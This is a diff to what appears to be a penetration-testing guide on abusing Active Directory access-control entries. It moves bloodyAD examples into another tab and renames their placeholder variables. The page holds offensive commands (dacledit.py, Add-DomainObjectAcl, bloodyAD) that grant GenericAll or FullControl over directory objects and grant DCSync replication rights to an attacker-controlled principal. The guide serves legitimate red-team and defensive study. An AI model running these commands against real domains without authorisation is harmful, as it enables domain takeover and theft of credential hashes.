@@ -38,6 +38,16 @@ To enable inheritance, the `-inheritance` switch can be added to the command. Th
 # Give full control on the Users container with inheritance to the child object
 dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=Users,DC=domain,DC=local' -inheritance 'domain'/'user':'password'
 ```
+
+Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
+```bash
+# Give full control (with inheritance to the child object if applicable)
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll $TargetObject $ControlledPrincipal
+
+# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync $ControlledPrincipal
+```
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -54,17 +64,6 @@ Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIden
 {% hint style="info" %}
 A few tests showed the `Add-DomainObjectAcl` command needed to be run with the `-Credential` and `-Domain` options in order to work
 {% endhint %}
-{% endtab %}
-
-{% tab title="Windows/UNIX-like" %}
-It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
-```bash
-# Give full control (with inheritance to the child object if applicable)
-bloodyAD --host $DomainController -d $DOMAIN -u $ControlledUser -p $Password add genericAll $TargetObject $ControlledPrincipal
-
-# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
-bloodyAD --host $DomainController -d $DOMAIN -u $ControlledUser -p $Password add dcsync $ControlledPrincipal
-```
 {% endtab %}
 
 {% endtabs %}
